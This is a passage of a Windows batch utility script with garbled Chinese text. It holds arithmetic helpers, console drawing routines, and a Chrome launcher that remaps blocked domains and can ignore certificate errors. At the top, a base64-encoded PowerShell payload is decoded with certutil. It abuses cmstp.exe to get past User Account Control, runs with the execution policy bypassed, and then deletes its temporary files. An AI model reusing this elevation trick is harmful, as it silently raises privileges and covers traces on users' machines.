echo bWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCklmIChUZXN0LVBhdGggJEluZkZpbGVM
echo b2NhdGlvbikgew0KI0NvbW1hbmQgdG8gcnVuDQokcHMgPSBuZXctb2JqZWN0IHN5
echo c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzc3RhcnRpbmZvICJjOlx3aW5kb3dzXHN5
echo c3RlbTMyXGNtc3RwLmV4ZSINCiRwcy5Bcmd1bWVudHMgPSAiL2F1ICRJbmZGaWxl
echo TG9jYXRpb24iDQokcHMuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQoNCiNTdGFy
echo dCBpdA0KW3N5c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzXTo6U3RhcnQoJHBzKQ0K
echo DQpkbw0Kew0KCSMgRG8gbm90aGluZyB1bnRpbCBjbXN0cCBpcyBhbiBhY3RpdmUg
echo d2luZG93DQp9DQp1bnRpbCAoKFNldC1XaW5kb3dBY3RpdmUgY21zdHApLkh3bmQg
echo LW5lIDApDQoNCg0KI0FjdGl2YXRlIHdpbmRvdw0KU2V0LVdpbmRvd0FjdGl2ZSBj
echo bXN0cA0KDQojU2VuZCB0aGUgRW50ZXIga2V5DQpbU3lzdGVtLldpbmRvd3MuRm9y
echo bXMuU2VuZEtleXNdOjpTZW5kV2FpdCgie0VOVEVSfSIpDQp9
)>%temp%\2.base
set /p =%comspec% /c %exe% -ks<nul>%temp%\su.bat
set /p =%temp%\su.bat<nul>%temp%\su.txt
certutil -decode -f "%temp%\1.base" %temp%\1.txt>nul
certutil -decode -f "%temp%\2.base" %temp%\2.txt>nul
copy /b "%temp%\1.txt"+"%temp%\su.txt"+"%temp%\2.txt" "%temp%\bypass.ps1">nul
powershell -mta -nologo -noprofile -executionpolicy bypass -file "%temp%\bypass.ps1">nul
timeout /t 2 /nobreak>nul
del %temp%\su.txt;%temp%\1.base;%temp%\2.base;%temp%\1.txt;%temp%\2.txt;%temp%\bypass.ps1;%temp%\su.bat
exit 0
:xdwjs
setlocal
set Bytes=%~1
set danwei=%~2
if /i "!danwei!" equ "kb" (set /a bytes*=1024)
if /i "!danwei!" equ "mb" (set /a bytes*=1048576)
if /i "!danwei!" equ "gb" (set /a bytes*=1073741824)
if "%~3" == "" Goto :eof
call :Division !Bytes! 1152921504606846976 2 OK
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% EB
	Goto :eof
) else (call :Division !Bytes! 1125899906842624 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% PB
	Goto :eof
) else (call :Division !Bytes! 1099511627776 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% TB
	Goto :eof
) else (call :Division !Bytes! 1073741824 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% GB
	Goto :eof
) else (call :Division !Bytes! 1048576 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% MB
	Goto :eof
) else (call :Division !Bytes! 1024 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% KB
	Goto :eof
) else (
	endlocal&set %~3=%Bytes% Byte
	Goto :eof
)
:Division
setlocal
if "%~4" == "" Goto :eof
set Div.1=%~1
set Div.2=%~2
set Div.3=
set Div.I=0
set Div.D=%~3
set Div.1.Len.0=
set Div.2.Len.0=
set Div.Z=00000000
for /l %%i in (1 1 9) do set Div.Num.%%i=
for /l %%i in (1 1 7) do set Div.Z=!Div.Z!!Div.Z!
set Div.H=4096 2048 1024 512 256 128 64 32 16 8 4 2 1
for /l %%i in (1 1 2) do (
	set Div.N=0
	set Div.%%i.Len.2=0
	for %%j in (!Div.%%i:.^= !) do (
		set /a Div.N+=1
		set Div.M=Div.M%%j
		set Div.%%i.Len.!Div.N!=0
		for %%l in (!Div.H!) do (
			if "!Div.M:~%%l!" neq "" (
				set /a Div.%%i.Len.!Div.N!+=%%l
				set Div.M=!Div.M:~%%l!
			)
		)
		set /a Div.%%i.Len.0+=Div.%%i.Len.!Div.N!
	)
        set Div.%%i=!Div.%%i:.=!
)
if !Div.1.Len.2! gtr !Div.2.Len.2! (
	set /a Div.2.Len.0+=Div.1.Len.2-Div.2.Len.2
	) else (
		set /a Div.1.Len.0+=Div.2.Len.2-Div.1.Len.2
)
for /l %%i in (1 1 2) do (
	set Div.%%i=!Div.%%i!!Div.Z!
	for %%j in (!Div.%%i.Len.0!) do set Div.%%i=!Div.%%i:~,%%j!
)
for /f "tokens=* delims=0" %%i in ("!Div.2!") do (
	set Div.O=%%i
	set Div.2=0%%i
)
set Div.2.Len.0=1
for %%i in (!Div.H!) do (
	if "!Div.O:~%%i!" neq "" (
		set /a Div.2.Len.0+=%%i
		set Div.O=!Div.O:~%%i!
	)
)
set /a Div.Len=Div.2.Len.0+1
if !Div.1.Len.0! lss !Div.2.Len.0! (
	set Div.1.Len.0=!Div.2.Len.0!
	set Div.1=!Div.Z:~-%Div.2.Len.0%,-%Div.1.Len.0%!!Div.1!
)
set /a Div.1.Len.0+=Div.D
set Div.1=0!Div.1!!Div.Z:~,%Div.D%!
set Div.P=!Div.1:~,%Div.2.Len.0%!
set Div.T=0000000!Div.2!
set /a Div.J+=1
set /a Div.Tem.Len=Div.2.Len.0+7
if !Div.J! equ 1 (for %%i in (!1:~-1!) do (
	for /f "delims=" %%j in ("!%%i!") do (
		if %%~Zj equ !%Div.I%! set C=!Div.D!
		)
	)
)
for /l %%i in (1 1 9) do (
	set Div.V=0
	for /l %%j in (8 8 !Div.Tem.Len!) do (
		set /a Div.V=1!Div.T:~-%%j,8!*%%i+Div.V
        	set Div.Num.%%i=!Div.V:~-8!!Div.Num.%%i!
		set /a Div.V=!Div.V:~,-8!-%%i
	)
	set Div.Num.%%i=!Div.V!!Div.Num.%%i!
	set Div.Num.%%i=0000000!Div.Num.%%i:~-%Div.Len%!
)
for /l %%l in (!Div.2.Len.0! 1 !Div.1.Len.0!) do (
	set Div.P=!Div.Z!!Div.P!!Div.1:~%%l,1!
	set Div.P=!Div.P:~-%Div.Len%!
	if !Div.J! equ 1 (
		set Div.I.Tem=
		for %%i in (!%Div.I%!) do set Div.D.Tem=%%i
		for /l %%i in (0 1 9) do set Div.D.Tem=!Div.D.Tem:%%i=%%i !
		for %%i in (!Div.D.Tem!) do set /a Div.I.Tem=!Div.I.Tem!+%%i
		if !Div.I.Tem! neq 24 set C=
	)
	if "!Div.P!" geq "!Div.2!" (
		set Div.R=1
		set Div.S=0000000!Div.P!
		for /l %%i in (2 1 9) do (
			if "!Div.S!" geq "!Div.Num.%%i!" set Div.R=%%i
		)
		set Div.3=!Div.3!!Div.R!
		set Div.P=
		set Div.V=0
		for %%i in (!Div.R!) do (
			for /l %%j in (8 8 !Div.Tem.Len!) do (
				set /a Div.V=3!Div.S:~-%%j,8!-1!Div.Num.%%i:~-%%j,8!-!Div.V:~,1!%%2
				set Div.P=!Div.V:~1!!Div.P!
              		 )
		)	
	) else set Div.3=!Div.3!0
)
if defined Div.D if %Div.D% gtr 0 set Div.3=!Div.3:~,-%Div.D%!.!Div.3:~-%Div.D%!
for /f "tokens=* delims=0" %%i in ("!Div.3!") do set Div.3=%%i
if "!Div.3:~0,1!"=="." set Div.3=0!Div.3!
if "!Div.3!"=="" set Div.3=0
endlocal&set %~4=%Div.3%
goto :eof
:xsjc
setlocal
set /a N=0
for /f "tokens=1-8 delims=.:" %%I in ("%~2:%~1") do (
	set /a N+=10%%I%%100*360000+10%%J%%100*6000+10%%K%%100*100+10%%L%%100
	set /a N-=10%%M%%100*360000+10%%N%%100*6000+10%%O%%100*100+10%%P%%100
)
set Sco=!N!
set /a S=N/360000,N=N%%360000,F=N/6000,N=N%%6000,M=N/100,N=N*%%100
set /a n*=10
if %F% equ 0 (set T=%M%��%N%����) else set T=%F%��%M%��%N%����
if %s% neq 0 set t=%s%Сʱ%F%��%M%��%N%����
endlocal&set %~3=%T%
Goto :eof
:cf
setlocal
call :cf_1 %1 %2 %3 jg
endlocal&set %4=%jg%
goto :eof
:cf_1
set num=0
set dec_str=
set input=
if "%~4" equ "" (goto :eof)
set /a int_str=%1/%2
set /a mod=%1%%%2
if %mod% equ 0 goto end
:count_dec
set mod=%mod%0
if %mod% lss %2 (
    set dec_str=!dec_str!0
    goto count_dec
) else (
    set /a dec=%mod%/%2
    set dec_str=!dec_str!!dec!
    set /a mod=%mod%%%%2
)
set /a num+=1
if %mod% neq 0 if %num% lss %3 goto count_dec
:end
for /l %%i in (1,1,%3) do set zero_str=!zero_str!0
set dec_str=%dec_str%%zero_str%
set %~4=%int_str%.!dec_str:~0,%3!
goto :eof
:add
(set L=&for /l %%a in (1,1,8) do set L=!L!00000000
for /f "tokens=1-3 delims=." %%a in ("!L!%1.!L!") do set at=%%a&set aw=%%b%%c
for /f "tokens=1-3 delims=." %%a in ("!L!%2.!L!") do set bt=%%a&set bw=%%b%%c
set a=!at:~-64!!aw:~,64!&set b=!bt:~-64!!bw:~,64!&set e=&set v=200000000
for /l %%a in (8,8,128)do set/a v=1!b:~-%%a,8!+1!a:~-%%a,8!+!v:~-9,-8!-2&set e=!v:~-8!!e!
set e=!e:0= !&for /f "tokens=*" %%a in ("!e:~,-64!_.!e:~64!") do set e=%%~nxa
set e=!e:_=!&for %%a in ("!e: =0!") do endlocal&(if %3.==. (echo %%~a) else set %3=%%~a)
goto :eof)
:offdisplay
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
goto :eof
:choice
choice /c !cho! /n /m ���������ѡ��:
set shuru=!errorlevel!
goto :eof
:bk
setlocal
set cs=0
for /f "delims=: skip=2 tokens=2" %%a in ('"mode con"') do (
	set /a cs+=1
	if !cs! equ 1 (
		set h=%%a
	)
	if !cs! equ 2 (
		set l=%%a
	)
)
set /a h_1=h-1
set /a l_1=l-1
set /a l_4=l-4
for /l %%a in (0,1,!l_4!) do (
	set fh=!fh!-
)
set fh=+!fh!+
set /p =!cswz!1;1H!fh!<nul
for /l %%a in (2,1,!h_1!) do (
	set /p =!cswz!%%a;1H^|!cswz!%%a;!l_1!H^|<nul
)
set /p =!cswz!!h_1!;1H!fh!<nul
goto :eof
:fk
setlocal
set h=%1
set l=%2
set /a h1=h+1
set /a l1=%4-2
set /a h2=h+%3-2
set /a l2=l+%4-1
set /a h3=h+%3-1
for /l %%a in (1,1,!l1!) do (
	set fh=!fh!-
)
set fh=+!fh!+
set /p =!cswz!!h!;!l!H!fh!<nul
for /l %%a in (!h1!,1,!h2!) do (
	set /p =!cswz!%%a;!l!H^|!cswz!%%a;!l2!H^|<nul
)
set /p =!cswz!!h3!;!l!H!fh!<nul
goto :eof
:hx
setlocal
set h=%1
set l=%2
set /a cd=%3-2
for /l %%a in (1,1,!cd!) do (
	set fh=!fh!-
)
set fh=+!fh!+
set /p =!cswz!!h!;!l!H!fh!<nul
goto :eof
:sx
setlocal
set h=%1
set l=%2
set /a h1=h+1
set /a h2=h+%3-1
set /a cd=%3+h-2
set /p =!cswz!!h!;!l!H+<nul
for /l %%a in (!h1!,1,!cd!) do (
	set /p =!cswz!%%a;!l!H^|<nul
)
set /p =!cswz!!h2!;!l!H+<nul
goto :eof
:00
exit 0
:73
:chrome
@echo off&setlocal enabledelayedexpansion&chcp 936>nul
set "�����ض���=!temp!\�����ض���.txt"
set "�����ؽ���=!temp!\�����ؽ���.txt"
set "ǿ��ʹ��quic=!temp!\ǿ��ʹ��quic.txt"
if not exist "!�����ض���!" (
	(
		echo #wikipedia
		echo *.wikipedia.org=wikidata.org
		echo *.wikiquote.org=wikidata.org
		echo *.wikinews.org=wikidata.org
		echo;
		echo #pixiv
		echo pixiv.net=fastly.com
		echo *.pixiv.net=fastly.com
		echo *.pximg.net=pximg.net
		echo;
		echo #reddit
		echo reddit.com=github.githubassets.com
		echo *.reddit.com=github.githubassets.com
		echo *.redd.it=github.githubassets.com
		echo *.redditmedia.com=github.githubassets.com
		echo;
		echo #protonmail
		echo proton.me=pr.tn
		echo account.proton.me=a.pr.tn
		echo account-api.proton.me=b.pr.tn
		echo mail.proton.me=c.pr.tn
		echo;
		echo #youtube
		echo *.youtube.com=google-analytics.com
		echo *.ytimg.com=googleadservices.com
		echo *.ggpht.com=googleads.g.doubleclick.net
		echo youtube.com=static.doubleclick.net
		echo youtu.be=mt7.gstatic.com
		echo;
		echo #google
		echo *.google.com=googleadservices.com
		echo *.google.com.hk=googleadservices.com
		echo *.google.com.tw=googleadservices.com
		echo *.googleapis.com=googleads.g.doubleclick.net
		echo *.googleusercontent.com=static.doubleclick.net
		echo *.gstatic.com=alt6.gstatic.com
		echo *.cloudfunctions.net=alt6.gstatic.com
		echo *.blogspot.com=google-analytics.com
		echo;
		echo #github
		echo github.com=octocaptcha.com
		echo *.github.com=octocaptcha.com
		echo *.githubusercontent.com=fastly.com
		echo *.githubassets.com=fastly.com
		echo *.github.io=octocaptcha.com
		echo;
		echo #steam
		echo login.steampowered.com=login.steampowered.com
		echo help.steampowered.com=help.steampowered.com
		echo *.steampowered.com=steamuserimages-a.akamaihd.net
		echo steamcommunity.com=underlords.com
		echo *.steamcommunity.com=underlords.com
		echo;
		echo #onedrive
		echo onedrive.live.com=od0.live.com
		echo skyapi.onedrive.live.com=storage.live.com
		echo;
		echo #nyaa
		echo nyaa.si=nyaa.ddos-guard.net
		echo;
		echo #imgur
		echo imgur.com=fastly.com
		echo *.imgur.com=github.githubassets.com
		echo;
		echo #vercel.app
		echo vercel.app=no-sni.vercel-infra.com
		echo *.vercel.app=no-sni.vercel-infra.com
		echo;
		echo #twimg
		echo *.twimg.com=fastly.com
		echo;
		echo #lain.la
		echo *.lain.la=lain.la
		echo;
	)>"!�����ض���!"
)
if not exist "!�����ؽ���!" (
	(
		echo #wikipedia
		echo #wikidata.org=[2620:0:863:ed1a::1]
		echo wikidata.org=208.80.153.224
		echo;
		echo #protonmail
		echo pr.tn=185.70.42.45
		echo a.pr.tn=185.70.42.36
		echo b.pr.tn=185.70.42.20
		echo c.pr.tn=185.70.42.37
		echo;
		echo #youtube google
		echo #mt7.gstatic.com=[2404:6800:4008:c01::5a]
		echo mt7.gstatic.com=216.239.32.40
		echo #alt6.gstatic.com=[2404:6800:4008:c01::5a]
		echo alt6.gstatic.com=216.239.32.40
		echo #google-analytics.com=[2404:6800:4008:c01::5a]
		echo google-analytics.com=216.239.32.40
		echo #googleadservices.com=[2404:6800:4008:c01::5a]
		echo googleadservices.com=216.239.32.40
		echo #googleads.g.doubleclick.net=[2404:6800:4008:c01::5a]
		echo googleads.g.doubleclick.net=216.239.32.40
		echo #static.doubleclick.net=[2404:6800:4008:c01::5a]
		echo static.doubleclick.net=216.239.32.40
		echo;
		echo #nyaa
		echo nyaa.ddos-guard.net=186.2.163.20
		echo;
	)>"!�����ؽ���!"
)
if not exist "!ǿ��ʹ��quic!" (
	(
		echo #��֧��ͨ���
		echo www.google.com.hk
		echo www.google.com.tw
		echo www.google.com
		echo www.quora.com
		echo quora.com
		echo qsbr.cf2.quoracdn.net
		echo v2ex.com
		echo cdn.v2ex.com
		echo www.v2ex.com
		echo challenges.cloudflare.com
		echo www.openstreetmap.org
		echo tile.openstreetmap.org
		echo ipfs.io
		echo cloudflare-ipfs.com
		echo;
	)>"!ǿ��ʹ��quic!"
)
cd /d %~dp0
rem ����֤����� 0=���� 1=����
set "pass_cert_error=0"
rem ����֧��chrome�����е��������·��
set "chromium="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
if "!pass_cert_error!" equ "1" (
	set "ignore-certificate-errors=--ignore-certificate-errors"
)
if exist "chrome.exe" (
	set "chrome=chrome.exe"
	goto startchrome
) else (
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /v Path 2>nul"') do (
		set "chrome=%%a"
	)
	for /f "delims=" %%a in ("!chrome!") do (
		set "chrome=%%~fa"
	)
	if exist "!chrome!\Chrome.exe" (
		set "chrome=!chrome!\Chrome.exe"
		goto startchrome
	) else (
		for /f "delims=" %%a in ("!chromium!") do (
			set "chrome=%%~fa"
		)
		if exist "!chrome!" (
			goto startchrome
		) else (
			msg %username% û���ҵ������·��
			exit 0
		)
	)
)
:startchrome
for /f "delims=" %%a in ("!chrome!") do (
	tasklist /fi "IMAGENAME eq %%~nxa"|findstr /i /c:"%%~nxa">nul
	if "!errorlevel!" equ "0" (
		cls
		echo;%%~nxa��������,��ر������������.
		set /p =��������˳�<nul&pause>nul
		if "%1" neq "-chrome" (
			goto memuv2
		) else (
			goto :eof
		)
	)
)
if exist "!�����ض���!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!�����ض���!) do (
		set "host-rules=!host-rules!MAP %%a %%b, "
	)
	set "host-rules=--host-rules="!host-rules!""
)
if exist "!�����ؽ���!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!�����ؽ���!) do (
		set "host-resolver-rules=!host-resolver-rules!MAP %%a %%b, "
	)
	set "host-resolver-rules=--host-resolver-rules="!host-resolver-rules!""
)
if exist "!ǿ��ʹ��quic!" (
	for /f "eol=# tokens=1,2 delims=:" %%a in (!ǿ��ʹ��quic!) do (
		if "%%b" equ "" (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:443, "
		) else (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:%%b, "
		)
	)
	set "origin-to-force-quic-on=--origin-to-force-quic-on="!origin-to-force-quic-on!""
)
start /max "" "!chrome!" --profile-directory=Default --test-type !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors! %2
if "%1" neq "-chrome" (
	goto memuv2
) else (
	goto :eof
)
:checkvar
setlocal
if "%1" equ "" (
	goto :eof
) else (
	set "val=!%1!"
)
if "%2" equ "num" (
	goto checkvar_num
)
if "%2" equ "num." (
	goto checkvar_num.
)
if "%2" equ "-num" (
	goto checkvar_-num
)
if "%2" equ "-num." (
	goto checkvar_-num.
)
if "%2" equ "az" (
	goto checkvar_az
)
if "%2" equ "aznum" (
	goto checkvar_aznum
)
goto :eof
:checkvar_num
if defined %1 (
	for /f "delims=0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=1"
	goto :eof
) else (
	echo;1
	goto :eof
)
goto :eof
:checkvar_num.
if defined %1 (
	for /f "delims=.0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1,2 delims=." %%a in ("!%1!") do (
	if "%%a" neq "" (
		set "val1=%%a"
	) else (
		set "val1=0"
	)
	if "%%b" neq "" (
		set "val2=%%b"
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
if "!val1!!val2!" neq "" (
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
goto :eof
:checkvar_-num
if defined %1 (
	for /f "delims=0123456789-" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1 delims=-" %%a in ("!%1!") do (
	if "!%1:~0,1!" equ "-" (
		if "%3" neq "" (
			endlocal&set "%3=1"
			goto :eof
		) else (
			echo;1
			goto :eof
		)
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
goto :eof
:checkvar_-num.
set "val1=!val:~1!"
set "val2=!val:.=!"
if defined val1 (
	call :checkvar val1 num. jg
	if "!jg!" equ "1" (
		call :checkvar val2 -num jg
		if "!jg!" equ "1" (
			if "%3" neq "" (
				endlocal&set "%3=1"
				goto :eof
			) else (
				echo;1
				goto :eof
			)
		)
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)
goto :eof
:checkvar_az
if defined %1 (
	for /f "delims=abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
goto :eof
:checkvar_aznum
if defined %1 (
	for /f "delims=0123456789abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)

goto :eof
:sqrt
setlocal
set s=%1
set w=%2
if defined W (for /l %%i in (1 1 %W%) do set "s=!s!00") else set W=0
set p=!s!&set /a len=N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do IF "!p:~%%i!" NEQ "" set/a len+=%%i&set "p=!p:~%%i!"
set /a "N-=~(len%%2)"
set M=!s:~,%N%!
for /l %%i in (1 1 9) do set/a Mx=%%i*%%i&if !Mx! leq !M! set/a "i=%%i,j=100+M-Mx"
set /a "len-=1,Len_i=_N=i/5+1,p=i*20"
set j=!j:~-%_N%!&set p=0!p!&set kl=0000000
set /a _N=8-_N
for /l %%i in (%N% 2 !len!) do (
set "j=!j!!s:~%%i,2!"
if "!j:0=!" neq "" (
set /a Ln_i=Len_i+=2
if "!p!" lss "!j!" (
set d=Z&set in=!kl!!P!&set /a Ln_i+=7
for /l %%j in (9 -1 2) do (
if "!d!" gtr "!j!" (
set "x=%%j"
set d=&set /a "b=x*x"
for /l %%k in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%k,8!*%%j+b"
set d=!b:~-8!!d!&set /a "b=!b:~,-8!-%%j"
)
set d=!b!!d!
for %%k in (!Len_i!) do set "d=!d:~-%%k!"
)
)
if "!d!" gtr "!j!" (set d=!in!&set x=1&set b=1) else set d=!kl!!d!&set b=0
set j=!kl!!j!&set "t="
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
set "t=!b:~1!!t!"
)
for %%j in (!Len_i!) do set "j=!t:~-%%j!"
set "j=!j:~1!" ) else set "x=0"
set /a "Len_i-=1"
if "!x!" neq "0" (
if "!x!" geq "5" (
set p=&set b=0&set "in=!kl!!i!!x!"
set /a "Ln_i=Len_i+_N"
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
set p=!b:~1!!p!
)
set /a "b=!b:~,1!%%2"
for %%j in (!Len_i!) do set "p=!b:1=01!!p:~-%%j!0"
) else set /a t=x*2&set "p=!p:~,-1!!t!0"
) else set p=!p!0&set "j=!j:~1!"
) else set j=!j:~1!&set p=!p!0&set /a "Len_i+=1,x=0"
set i=!i!!x!
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do (endlocal&set %3=%%i)
goto :eof
:10to16
(setlocal
set "ran=%1"
:10to16_1
set /a "s=!ran!%%16"
if !s! lss 10 goto 10to16_3
if !s! gtr 12 goto 10to16_2
if "!s!" equ "10" set "s=A"&goto 10to16_3
if "!s!" equ "11" set "s=B"&goto 10to16_3
if "!s!" equ "12" set "s=C"&goto 10to16_3
:10to16_2
if "!s!" equ "13" set "s=D"&goto 10to16_3
if "!s!" equ "14" set "s=E"&goto 10to16_3
if "!s!" equ "15" set "s=F"&goto 10to16_3
:10to16_3
set "jg=!s!!jg!"
set /a "ran/=16"
if !ran! neq 0 goto 10to16_1
if "%2" neq "" (
	endlocal&set "%2=%jg%"
) else (
	endlocal&echo %jg%
)
goto :eof
)
:10to2
(setlocal
set "num=%1"
:10to2_1
set /a "e=num%%2"
set /a "num/=2"
set "num1=!e!!num1!"
if !num! neq 0 goto 10to2_1
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo %num1%
)
goto :eof
)
:10to8
(setlocal
set "num=%1"
:10to8_2
set /a "b=num%%8"
set /a "num/=8"
set "num1=!b!!num1!"
if !num! neq 0 goto 10to8_2
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo %num1%
)
goto :eof
)
:2to10
(setlocal
set nn=
set "nnn=1"
set "n=%1"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do (
	set "nn=%%a !nn!"
)
for %%a in (!nn!) do (
	set /a "num+=%%a*nnn,nnn*=2"
)
if "%2" neq "" (
	endlocal&set "%2=%num%"
) else (
	endlocal&echo %num%
)
goto :eof
)
:calc
set a=%~1.0
set b=%~3.0
for /f "tokens=1,2 delims=." %%a in ("%a:-=%") do set "a_1=%%a"&set "a_2=%%b"
for /f "tokens=1,2 delims=." %%a in ("%b:-=%") do set "b_1=%%a"&set "b_2=%%b"
call :strlenx %a_1% L1_1
call :strlenx %a_2% L1_2
call :strlenx %b_1% L2_1
call :strlenx %b_2% L2_2
for %%i in (1 2) do (
    set "zero="&set m=0
    if !L1_%%i! leq !L2_%%i! (
        set /a m=L2_%%i-L1_%%i
        if !m! neq 0 (
            for /l %%a in (1 1 !m!) do set zero=!zero!0
        )
        if "%%i" equ "1" (set a_%%i=!zero!!a_%%i!) else set a_%%i=!a_%%i!!zero!
        set Len_%%i=!L2_%%i!
    ) else (
        set /a m=L1_%%i-L2_%%i
        for /l %%a in (1 1 !m!) do set zero=!zero!0
        if "%%i" equ "1" (set b_%%i=!zero!!b_%%i!) else set b_%%i=!b_%%i!!zero!
        set Len_%%i=!L1_%%i!
    )
)
set /a Len=Len_1+Len_2+1
if "%~2" equ "+" (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
        ) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
        )
    ) else (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
        ) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
        )
    )
) else (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
        ) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
        )
    ) else (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
        ) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
        )
    )
)
goto :eof
:strlenx
setlocal
set "$=%1#"
set len=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. neq . set/a len+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/a len+=0x!$:~16,1!
endlocal&set %2=%len%&goto :eof
:jia
setlocal
set a=%~1
set b=%~2
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
    ) else (
        set /a "c=t+!a:~%%a,1!+!b:~%%a,1!"
        if !c! geq 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
    )
)
if %t% equ 1 (set s=1!s!)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=1* delims=0" %%c in (".%%b") do if "%%c%%d" equ "." set s=%%a
)
endlocal&set %~4=%s%&goto :eof
:jian
setlocal
if "%~1" lss "%~2" (
    set a=%~2
    set b=%~1
) else (
    set a=%~1
    set b=%~2
)
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
    ) else (
        set /a "c=10+!a:~%%a,1!-!b:~%%a,1!-t"
        if !c! lss 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
    )
)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=* delims=0" %%c in ("%%a") do if "%%c" equ "" (set pre=0) else set pre=%%c
    for /f "tokens=* delims=0" %%c in ("%%b") do if "%%c" equ "" (set s=!pre!) else set s=!pre!.%%b
)
endlocal&set %~4=%s%&goto :eof
:pdxp
set zmlj=%zmlj:~19%\
if /i "!system!" equ "Microsoft Windows XP Home" (set system= - Windows XP ��ͥ��)
if /i "!system!" equ "Microsoft Windows XP Professional" (set system= - Windows XP רҵ��)
goto :eof
:pd7
set zmlj=%zmlj:~25%\
